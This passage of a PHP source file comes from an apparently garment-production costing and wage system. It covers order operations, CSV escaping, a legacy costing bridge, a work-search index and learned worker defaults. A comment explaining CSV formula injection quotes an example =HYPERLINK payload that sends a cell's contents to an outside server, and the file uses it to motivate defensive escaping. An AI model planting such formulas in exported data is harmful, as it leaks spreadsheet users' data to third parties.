 * below finds anything this order has booked work or an amendment on and adds
 * it back, marked on_order=false. Nothing this order is carrying can hide.
 *
 * One more fix while here: the old version keyed by op id inside the product
 * loop, so when two products on the same order shared a part, the LAST product
 * name silently overwrote the first. Product names are now collected as a list. */
function zp_ops_for_order(int $proformaId): array {
    $booked = zp_booked_on_order($proformaId);
    $amend  = zp_order_rate_map($proformaId);
    $out    = [];

    $row = function (int $oid, string $part, string $op, string $stage, float $std, bool $onOrder) use ($booked, $amend) {
        return [
            'id' => $oid, 'part' => $part, 'operation' => $op, 'stage' => $stage,
            'standard' => $std, 'products' => [],
            'booked_qty' => (float)($booked[$oid]['qty'] ?? 0),
            'booked_amt' => (float)($booked[$oid]['amt'] ?? 0),
            'amended'    => array_key_exists($oid, $amend),
            'on_order'   => $onOrder,
        ];
    };

    foreach (zp_open_lines() as $l) {
        if ((int)$l['proforma_id'] !== $proformaId) continue;
        foreach (zp_product_parts((int)$l['product_id']) as $p) {
            foreach (zp_part_ops((int)$p['id'], true) as $o) {
                $oid = (int)$o['id'];
                if (!isset($out[$oid]))
                    $out[$oid] = $row($oid, (string)$p['part_name'], (string)$o['operation_name'],
                                      (string)$o['stage'], (float)$o['rate'], true);
                $name = trim((string)$l['product_name']);
                if ($name !== '' && !in_array($name, $out[$oid]['products'], true))
                    $out[$oid]['products'][] = $name;
            }
        }
    }

    /* Second pass: anything this order is carrying that the walk above missed. */
    $stray = array_diff(array_merge(array_keys($booked), array_keys($amend)), array_keys($out));
    if ($stray) {
        try {
            $in = implode(',', array_fill(0, count($stray), '?'));
            $st = db()->prepare("SELECT o.id, o.operation_name, o.stage, o.rate, p.part_name
                                 FROM zp_part_ops o JOIN zp_parts p ON p.id = o.part_id
                                 WHERE o.id IN ($in)");
            $st->execute(array_values(array_map('intval', $stray)));
            foreach ($st->fetchAll() as $s) {
                $oid = (int)$s['id'];
                $out[$oid] = $row($oid, (string)$s['part_name'], (string)$s['operation_name'],
                                  (string)$s['stage'], (float)$s['rate'], false);
            }
        } catch (Throwable $e) {}
    }

    foreach ($out as &$r) $r['related'] = ($r['booked_qty'] > 0 || $r['amended']);
    unset($r);

    /* Worked and amended rows first — what the screen is for is at the top. */
    $out = array_values($out);
    usort($out, function ($a, $b) {
        if ($a['related'] !== $b['related']) return $a['related'] ? -1 : 1;
        if ($a['booked_qty'] !== $b['booked_qty']) return $b['booked_qty'] <=> $a['booked_qty'];
        return strcmp($a['part'] . $a['operation'], $b['part'] . $b['operation']);
    });
    return $out;
}

/* ============================================================
   CSV SAFETY — A SPREADSHEET IS A PROGRAM, NOT A DOCUMENT
   ============================================================

   Found in a security pass, and it matters here more than in most apps.

   Excel treats a cell beginning with =, +, - or @ as a FORMULA, not as text.
   Your part names, product names and worker names are typed by a data-entry
   team — and then exported to CSV and opened by whoever asked for the report.
   A part named

       =HYPERLINK("http://somewhere/?"&A1,"Bed Sheet")

   looks like an ordinary name on screen. Opened in Excel it becomes a live
   link that carries the contents of a neighbouring cell to somebody else's
   server, and it looks entirely legitimate while doing it. Older Excel with DDE
   enabled could be talked into worse.

   THE FIX: a cell that starts with one of those characters is prefixed with a
   single quote on the way out, which is Excel's own "treat this as text"
   marker. It displays as the original text and cannot execute.

   AND THE ROUND TRIP IS PRESERVED: the import strips ONE leading quote back
   off, so a file exported and re-imported is unchanged. Without that half, a
   name would gain a quote every time it made the trip. */
function zp_csv_cell($v): string {
    $s = (string)$v;
    if ($s === '') return $s;
    /* tab and carriage return are here too: Excel strips them and can end up
       looking at the character behind them, which may be an =
     *
     * AND AN APOSTROPHE IS IN THIS LIST, which is not obvious and is not about
     * safety — it is about the round trip. The import strips ONE leading
     * apostrophe back off. If the export did not add one to a name that already
     * began with an apostrophe, that name would come back a character shorter
     * every time it made the trip: 'Special -> Special.
     *
     * Quoting it here makes the pair exactly reversible for every input, which
     * is the only version of this that is safe to run over your data
     * repeatedly. (Found by the test below asserting the round trip, not by
     * reading the code.) */
    if (strpbrk($s[0], "=+-@\t\r'") !== false) return "'" . $s;
    return $s;
}

/* Every cell of one row, made safe in one call. */
function zp_csv_row(array $row): array { return array_map('zp_csv_cell', $row); }

/* The other half of the round trip. */
function zp_csv_unquote($v): string {
    $s = (string)$v;
    return ($s !== '' && $s[0] === "'") ? substr($s, 1) : $s;
}

/* ============================================================
   THE BRIDGE — KEEPING COSTING FED
   ============================================================

   WHAT WENT WRONG, PLAINLY.

   The rebuild moved sizes to zp_sizes and wage rates to zp_part_ops. Costing
   was never moved with it: product_costing.php still reads product_sizes for
   the size list and production_operations for the Workmanship rate. So a size
   added in Product Master never reached Costing, and Workmanship computed to
   zero — every costing sheet saved since the rebuild is missing its stitching
   and cutting wages, and any suggested price built on one is too low.

   WHY THE FIX GOES THIS WAY AND NOT THE OTHER.

   product_sizes is read by fifteen files — proforma, search, both print
   screens, Final Costing, the AI costing and AI check. Repointing Costing at
   zp_sizes would fix one screen and leave fourteen split. So the NEW module
   feeds the OLD tables instead, one way, on save. Costing is not edited at
   all: it keeps reading exactly what it has always read, and starts seeing
   real sizes and real rates.

   THE THREE RULES THIS OBEYS.

   1. NOTHING ON THE OLD SIDE IS EVER DELETED. A size in product_sizes that no
      longer exists in zp_sizes is left alone: a saved costing version points
      at that size id through costing_version_sizes, and removing it would
      orphan a costing somebody already approved. Only rows this bridge itself
      wrote (marked with zp_op_id) are ever removed.

   2. A LEGACY OPERATION IS DEACTIVATED, NOT DESTROYED. production_operations
      is SUMmed per component+operation. If a hand-entered legacy row survived
      next to a mirrored one, the product would cost DOUBLE its true
      workmanship — silently, and in the direction that loses a deal. So legacy
      rows on a product this bridge now owns are set is_active=0. The row, its
      rate and its history stay on disk and can be switched back on.

   3. THE OLD STAGE COLUMN IS AN ENUM. production_operations.stage accepts only
      Cutting, Stitching or Dispatch. 'Manual Cutting' is not in it and MySQL
      would reject the row outright in strict mode, or store an empty string in
      loose mode — losing the operation and its rate with no error anybody sees.
      Manual Cutting is therefore written as Cutting. Nothing is lost by it:
      Costing sums rates and never reads the stage, and the real stage stays
      exact in zp_part_ops where the wage ledger reads it. */

/* Manual Cutting is a real stage to the floor, but the old ENUM has no word
   for it. Costing does not read stage, so mapping it is safe — silently
   writing an invalid value would not be. */
function zp_bridge_stage(string $stage): string {
    /* The two words here are the OLD costing table's own ENUM values, not stage
       names of yours — production_operations.stage accepts only Cutting,
       Stitching or Dispatch and rejects or blanks anything else. Your stage is
       mapped onto them BY POSITION: the stage that makes the pieces goes to
       'Cutting', every later stage to 'Stitching'. Nothing is lost by it —
       Costing sums rates and never reads the stage, and your real stage stays
       exact in zp_part_ops.stage_id where every rule is decided. */
    return zp_is_cutting($stage) ? 'Cutting' : 'Stitching';
}

/* Marks the rows this bridge owns, so a rate the team typed into the old
   screen years ago is never mistaken for one of ours and deleted. */
function zp_bridge_schema(): void {
    static $done = false;
    if ($done) return;
    $done = true;
    try { db()->exec("ALTER TABLE production_operations ADD COLUMN zp_op_id INT NULL DEFAULT NULL"); } catch (Throwable $e) {}
    try { db()->exec("CREATE INDEX idx_zp_op ON production_operations (zp_op_id)"); } catch (Throwable $e) {}
}

/* THE SIZE MIRROR IS GONE, AND THAT IS THE POINT.
 *
 * zp_bridge_sizes() used to copy every size from zp_sizes into product_sizes on
 * each save. There is now ONE size table, so there is nothing to copy: a size
 * typed in Product Master IS the size Costing and Proforma read, the same row,
 * the same id, the same instant.
 *
 * This function is kept only as the shape the rest of the bridge expects —
 * a map of size id to size id, which for one table is every size mapped to
 * itself. It writes nothing at all. */
function zp_bridge_sizes(int $productId): array {
    $map = [];
    foreach (zp_sizes($productId) as $s) $map[(int)$s['id']] = (int)$s['id'];
    return $map;
}

/* OPERATIONS: zp_part_ops -> production_operations.
 *
 * One "All Sizes" row per part+operation (product_size_id NULL), carrying the
 * standard rate — because the quantity-per-set is what usually varies by size,
 * and pc_workmanship_rate_for_version() multiplies those back together.
 *
 * PLUS, NOW, ONE EXTRA ROW PER SIZE RATE. product_size_id has existed on this
 * table all along and costing genuinely reads it — but this function used to
 * write NULL on every INSERT *and* every UPDATE, so a size rate set by hand
 * here was wiped the next time a product's operations were saved. The column
 * looked usable and was not. It is written properly now, from zp_op_rate.
 *
 * Costing therefore needs no change at all: pc_workmanship_rate_for_version()
 * already prefers a size-scoped row over the All Sizes one. */
/* Set operation ids are mirrored into production_operations.zp_op_id at
   this offset, because zp_part_ops and zp_set_ops each number from 1 and
   that one column has to be able to name both. Ten million is far above any
   part op id this business will ever reach, and a marker is not a foreign
   key — nothing joins on it, the bridge only reads back what it wrote. */
const ZP_SET_OP_BASE = 10000000;

function zp_bridge_ops(int $productId): array {
    zp_bridge_schema();
    $wrote = 0; $deactivated = 0;
    try {
        /* what the new module says this product's workmanship is */
        $want = [];
        foreach (zp_product_parts($productId) as $p) {
            foreach (zp_part_ops((int)$p['id'], true) as $o) {
                $want[(int)$o['id']] = [
                    'component' => (string)$p['part_name'],
                    'operation' => (string)$o['operation_name'],
                    'stage'     => zp_bridge_stage((string)$o['stage']),
                    'rate'      => (float)$o['rate'],
                ];
            }
        }

        /* SET WORK GOES INTO COSTING TOO, AND IT HAS TO.
           A set was priced on part work alone, which left the folding, the
           poly bag and the carton out of every quote — real labour, given
           away. It is mirrored beside the part operations, under the
           component name "(whole set)" so a costing sheet says plainly which
           lines are not part work.

           THE OFFSET IS THE POINT OF THIS BLOCK. production_operations marks
           our rows with zp_op_id, and zp_part_ops and zp_set_ops each number
           from 1 — so set op 4 and part op 4 would fight over one marker and
           the bridge would rewrite one as the other on every save. Set ops
           are marked at ZP_SET_OP_BASE + id, far above any real part op id,
           which keeps one column able to name two tables. */
        foreach (zp_set_ops($productId, true) as $o) {
            $want[ZP_SET_OP_BASE + (int)$o['id']] = [
                'component' => '(whole set)',
                'operation' => (string)$o['operation_name'],
                'stage'     => zp_bridge_stage((int)($o['stage_id'] ?? 0) > 0
                                 ? zp_stage_name((int)$o['stage_id']) : ''),
                'rate'      => (float)$o['rate'],
            ];
        }

        /* RULE 2: a legacy row next to a mirrored one would DOUBLE the cost.
           Switched off, never deleted — the rate and its history stay on disk. */
        if ($want) {
            $off = db()->prepare("UPDATE production_operations SET is_active=0
                                  WHERE product_id=? AND zp_op_id IS NULL AND is_active=1");
            $off->execute([$productId]);
            $deactivated = $off->rowCount();
        }

        /* EVERY SIZE RATE BECOMES ITS OWN ROW, BESIDE THE "ALL SIZES" ONE.
           product_size_id NULL is the fallback costing uses when the version is
           not tied to exactly one size; a size row wins when it is. */
        $sizeRates = zp_op_rate_map($productId);
        /* Set work keeps its per-size rates in a table of its own, so they are
           looked up under the same offset the ops were mirrored at — read from
           the right table, written under the right marker. */
        foreach (zp_set_rate_map($productId) as $sopId => $bySize)
            $sizeRates[ZP_SET_OP_BASE + (int)$sopId] = $bySize;
        $want2 = [];
        foreach ($want as $zid => $w) {
            $want2[$zid . '|0'] = $w + ['size' => null];        // the All Sizes row
            foreach (($sizeRates[$zid] ?? []) as $sid => $rate)
                $want2[$zid . '|' . (int)$sid] = ['component' => $w['component'],
                                                  'operation' => $w['operation'],
                                                  'stage'     => $w['stage'],
                                                  'rate'      => (float)$rate,
                                                  'size'      => (int)$sid];
        }

        /* our own previous mirror for this product.
           KEYED ON zp_op_id *AND* SIZE. Keyed on the op alone — as it was when
           every row was All Sizes — several rows for one operation would
           collapse onto one key, and the bridge would rewrite the same row over
           and over while leaving the rest to be deleted as strays. */
        $cur = db()->prepare("SELECT id, zp_op_id, product_size_id FROM production_operations
                              WHERE product_id=? AND zp_op_id IS NOT NULL");
        $cur->execute([$productId]);
        $have = [];
        foreach ($cur->fetchAll() as $r)
            $have[(int)$r['zp_op_id'] . '|' . (int)($r['product_size_id'] ?? 0)] = (int)$r['id'];

        $ins = db()->prepare("INSERT INTO production_operations
                              (product_id, operation_name, component_name, stage, product_size_id, rate, is_active, zp_op_id)
                              VALUES (?,?,?,?,?,?,1,?)");
        $upd = db()->prepare("UPDATE production_operations
                              SET operation_name=?, component_name=?, stage=?, product_size_id=?, rate=?, is_active=1
                              WHERE id=?");
        foreach ($want2 as $key => $w) {
            $zid = (int)explode('|', $key)[0];
            if (isset($have[$key]))
                $upd->execute([$w['operation'], $w['component'], $w['stage'], $w['size'], $w['rate'], $have[$key]]);
            else
                $ins->execute([$productId, $w['operation'], $w['component'], $w['stage'], $w['size'], $w['rate'], $zid]);
            $wrote++;
        }

        /* an operation deleted or deactivated in the new module, OR a size rate
           that has been cleared: this row IS ours, so removing it is safe and is
           the only delete in the bridge. Deleted by ROW ID, not by zp_op_id —
           the latter would take the All Sizes row with the size rows. */
        $gone = array_diff_key($have, $want2);
        if ($gone) {
            $in = implode(',', array_fill(0, count($gone), '?'));
            /* zp_op_id IS NOT NULL is belt AND braces. Every id in $have came
               from a SELECT that already required it, so this adds nothing
               today — but it keeps "only rows the bridge itself wrote" true
               inside the DELETE rather than two statements away, where a later
               change to the SELECT could quietly widen it. A legacy row that
               somebody typed by hand is not ours to remove. */
            $del = db()->prepare("DELETE FROM production_operations
                                  WHERE product_id=? AND zp_op_id IS NOT NULL AND id IN ($in)");
            $del->execute(array_merge([$productId], array_map('intval', array_values($gone))));
        }
    } catch (Throwable $e) { return ['ops' => $wrote, 'legacy_off' => $deactivated, 'error' => $e->getMessage()]; }
    return ['ops' => $wrote, 'legacy_off' => $deactivated, 'error' => ''];
}

/* QUANTITY PER SET: zp_part_qty -> product_component_qty, in the old table's
   size ids. A part with no row means one per set, never zero — the same rule
   zp_qty_for() uses, so Costing and the floor cannot disagree about it. */
function zp_bridge_qty(int $productId, array $sizeMap): int {
    if (!$sizeMap) return 0;
    $n = 0;
    try {
        $qty = zp_qty_map($productId);
        $parts = zp_product_parts($productId);
        $up = db()->prepare("INSERT INTO product_component_qty (product_id, product_size_id, component_name, qty_per_set)
                             VALUES (?,?,?,?) ON DUPLICATE KEY UPDATE qty_per_set=VALUES(qty_per_set)");
        foreach ($parts as $p) {
            foreach ($sizeMap as $zpSizeId => $oldSizeId) {
                $up->execute([$productId, $oldSizeId, (string)$p['part_name'],
                              zp_qty_for($qty, (int)$p['id'], (int)$zpSizeId)]);
                $n++;
            }
        }
    } catch (Throwable $e) { return $n; }
    return $n;
}

/* Mirror ONE product into the old tables. Called after a Product Master save. */
function zp_bridge_sync_product(int $productId): array {
    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.'];
    zp_ensure_schema();
    $sizeMap = zp_bridge_sizes($productId);
    $ops     = zp_bridge_ops($productId);
    $qty     = zp_bridge_qty($productId, $sizeMap);
    return ['ok' => $ops['error'] === '', 'error' => $ops['error'],
            'sizes' => count($sizeMap), 'ops' => $ops['ops'],
            'legacy_off' => $ops['legacy_off'], 'qty' => $qty];
}

/* A RATE LIVES ON THE PART, AND A PART IS SHARED.
   Changing the Overlock rate in the Part Library changes the workmanship of
   every product that uses that part, so every one of them has to be re-fed —
   otherwise the Part Library and Costing quietly disagree about the wage. */
function zp_bridge_sync_part(int $partId): array {
    if ($partId <= 0) return ['products' => 0];
    zp_ensure_schema();
    $ids = [];
    try {
        $st = db()->prepare("SELECT DISTINCT product_id FROM zp_product_parts WHERE part_id=?");
        $st->execute([$partId]);
        $ids = array_map('intval', array_column($st->fetchAll(), 'product_id'));
    } catch (Throwable $e) { return ['products' => 0]; }
    foreach ($ids as $pid) zp_bridge_sync_product($pid);
    return ['products' => count($ids)];
}

/* EVERY PRODUCT, ONCE — the catch-up for what the rebuild already broke.
   Products saved before the bridge existed have no mirror, so their costing
   still reads zero. This walks them all. */
function zp_bridge_sync_all(): array {
    zp_ensure_schema();
    $n = 0; $ops = 0;
    try {
        $ids = array_map('intval', array_column(
            db()->query("SELECT DISTINCT product_id FROM zp_product_parts")->fetchAll(), 'product_id'));
    } catch (Throwable $e) { return ['products' => 0, 'ops' => 0]; }
    foreach ($ids as $pid) { $r = zp_bridge_sync_product($pid); $n++; $ops += (int)$r['ops']; }
    return ['products' => $n, 'ops' => $ops];
}

/* ============================================================
   THE WORK INDEX — ONE FLAT LIST, SEARCHED AS YOU TYPE
   ============================================================

   The entry screen used to be three dropdowns: order, then operation, then
   worker. Three decisions and three clicks for every line. At 200-300 lines a
   day that is the whole job, and it is slow in the way that makes people batch
   the work up and enter it days late.

   So the picker becomes ONE list, and a row in it is a whole piece of work:

       PI-1042 · Ideal Home · 7 pcs Bed in Bag · Double
       Pillow Case -> Overlock · 5.00/pc · 420 left

   Type any part of any of it and the list shortens. Press Enter and every one
   of those fields is filled in — the size included, which is why the size had
   to be linked properly first. Nothing is left to type but the quantity.

   THE SEARCH TEXT IS BUILT HERE, ON THE SERVER, so the browser never has to
   guess what a row means. 'hay' is everything about the row folded into one
   lower-cased string; the browser just checks that every typed word appears
   in it somewhere.

   WHAT IS LEFT is on every row, and it comes from the same zp_remaining() the
   save uses — so the list can never offer more than the server will accept. */
function zp_work_index(): array {
    zp_ensure_schema();
    $prog = zp_progress_map();
    $out  = [];
    foreach (zp_open_lines() as $l) {
        if (zp_size_problem($l) !== '') continue;     // cannot be planned, so cannot be offered
        $pid   = (int)$l['product_id'];
        $rates = zp_order_rate_map((int)$l['proforma_id']);
        /* THE LIST MUST QUOTE WHAT THE SAVE WILL PAY. If this read the standard
           rate while zp_book() froze a size rate, the floor would be shown one
           number and paid another — and the difference would only ever surface
           in a wage dispute. */
        $szRates = zp_op_rate_map($pid);
        $szId    = zp_line_size_id($l);
        foreach (zp_product_parts($pid) as $p) {
            $partId = (int)$p['id'];
            foreach (zp_part_ops($partId, true) as $o) {
                $opId  = (int)$o['id'];
                $left = zp_remaining($l, $partId, $opId, (string)$o['stage'], $prog);
                /* FINISHED WORK IS CARRIED, MARKED — NOT DROPPED.
                   Dropping it would make a search for it come back "nothing
                   matches", which reads as "that job does not exist" when the
                   truth is "that job is done". Those two need different answers:
                   one is a typo to correct, the other is good news. The list
                   only OFFERS open work, but it can now say which it is. */
                $done = $left <= 0.0001;
                $rate  = zp_rate_for($opId, (float)$o['rate'], $rates, $szRates, $szId);
                /* THE STAGE ID TRAVELS WITH THE ROW, not just its spelling.
                   The worker list is narrowed by stage, and matching on a name
                   would break the first time a stage is renamed — which is the
                   exact bug the whole module moved to stage_id to avoid. */
                $stageId = (int)($o['stage_id'] ?: zp_stage_id_for((string)$o['stage']));
                $stage = zp_stage_name($stageId);
                $out[] = [
                    'k'    => (int)$l['item_id'] . ':' . $opId,
                    'item' => (int)$l['item_id'],
                    'op'   => $opId,
                    /* Which table `op` points at. Stated on every row, not
                       only on the set ones, so the browser posts it back
                       without ever having to assume a default. */
                    'kind' => 'part',
                    'part' => $partId,
                    /* SHORT ON SCREEN, WHOLE FOR SEARCHING. `pi` is what the
                       row prints; `hay` below still holds the full number,
                       so typing either form finds the job. */
                    'pi'   => short_ref((string)$l['pi_no']),
                    'pifull' => (string)$l['pi_no'],
                    'cust' => (string)($l['customer_name'] ?? ''),
                    'prod' => (string)$l['product_name'],
                    'size' => (string)($l['size'] ?? ''),
                    'pn'   => (string)$p['part_name'],
                    'on'   => (string)$o['operation_name'],
                    'st'   => $stage,
                    'sid'  => $stageId,
                    'rate' => round($rate, 2),
                    'left' => round($left, 2),
                    'done' => $done ? 1 : 0,
                    'hay'  => mb_strtolower(trim(implode(' ', [
                                  $l['pi_no'], $l['customer_name'] ?? '', $l['product_name'],
                                  $l['size'] ?? '', $p['part_name'], $o['operation_name'], $stage,
                              ]))),
                ];
            }
        }

        /* ---- and the jobs done to the whole set ----
           Same row shape, so the picker, the keyboard, the search and the
           in-row list need no special case. Two things differ and both are
           on the row: the part name is "(whole set)", and LEFT is counted in
           SETS against the order quantity — folding happens as parts arrive,
           so it must not wait on the slowest part. */
        foreach (zp_line_set_work((int)$l['item_id'], $pid, $szId) as $w) {
            $done = (float)($prog['set'][(int)$l['item_id']][$w['kind']][(int)$w['id']] ?? 0);
            $left = max(0.0, (float)$l['ordered_qty'] - $done);
            $stage = (int)$w['stage_id'] > 0 ? zp_stage_name((int)$w['stage_id']) : '';
            $out[] = [
                'k'    => (int)$l['item_id'] . ':' . $w['kind'] . ':' . (int)$w['id'],
                'item' => (int)$l['item_id'],
                'op'   => (int)$w['id'],
                'kind' => $w['kind'],          // 'set' or 'line' — which table op points at
                'part' => 0,
                'pi'   => short_ref((string)$l['pi_no']),
                'pifull' => (string)$l['pi_no'],
                'cust' => (string)($l['customer_name'] ?? ''),
                'prod' => (string)$l['product_name'],
                'size' => (string)($l['size'] ?? ''),
                'pn'   => '(whole set)',
                'on'   => (string)$w['name'],
                'st'   => $stage,
                'sid'  => (int)$w['stage_id'],
                'rate' => round((float)$w['rate'], 2),
                'left' => round($left, 2),
                'done' => $left <= 0.0001 ? 1 : 0,
                'hay'  => mb_strtolower(trim(implode(' ', [
                              $l['pi_no'], $l['customer_name'] ?? '', $l['product_name'],
                              $l['size'] ?? '', 'whole set', $w['name'], $stage,
                          ]))),
            ];
        }
    }
    return $out;
}

/* ============================================================
   LEARNED DEFAULTS — WHAT THIS WORKER USUALLY DOES
   ============================================================

   Asked for in your words: "if worker Ali only using for cutting, so trend keep
   remember and mostly likely their related usual trend, but it's not fix".

   The name for that is a LEARNED DEFAULT. Nothing is fixed to anybody: every
   worker can still be booked on every operation, and every operation can still
   be given to anybody. What changes is only the ORDER of the list — the ones
   that person actually does float to the top, so the common case is the first
   thing under the cursor and the rare case is still one keystroke away.

   IT IS LEARNED FROM WHAT WAS REALLY BOOKED, not from a setting somebody has
   to maintain. A setting would be wrong within a month and nobody would notice.

   RECENT WORK COUNTS FOR MORE. A worker moved from Cutting to Stitching three
   weeks ago should rank as a stitcher now, so the last 30 days are weighted
   three times the 90-day history behind them.

   CANCELLED ENTRIES ARE EXCLUDED. A mistake that was corrected must not teach
   the screen to suggest the same mistake again. */
function zp_worker_habit(int $days = 90): array {
    zp_ensure_schema();
    $out = ['byWorker' => [], 'byOp' => []];
    try {
        $from   = date('Y-m-d', strtotime("-$days days"));
        $recent = date('Y-m-d', strtotime('-30 days'));
        $st = db()->prepare(
            "SELECT worker_id, op_id,
                    COUNT(*) n,
                    SUM(CASE WHEN entry_date >= ? THEN 1 ELSE 0 END) recent
             FROM zp_entries
             WHERE status='active' AND entry_date >= ?
             GROUP BY worker_id, op_id");
        $st->execute([$recent, $from]);
        foreach ($st->fetchAll() as $r) {
            $w = (int)$r['worker_id']; $o = (int)$r['op_id'];
            /* recent work counts triple: the extra weight is 2x the recent
               count on top of the 1x every entry already carries */
            $score = (int)$r['n'] + 2 * (int)$r['recent'];
            $out['byWorker'][$w][$o] = $score;
            $out['byOp'][$o][$w]     = $score;
        }
    } catch (Throwable $e) {}
    return $out;
}
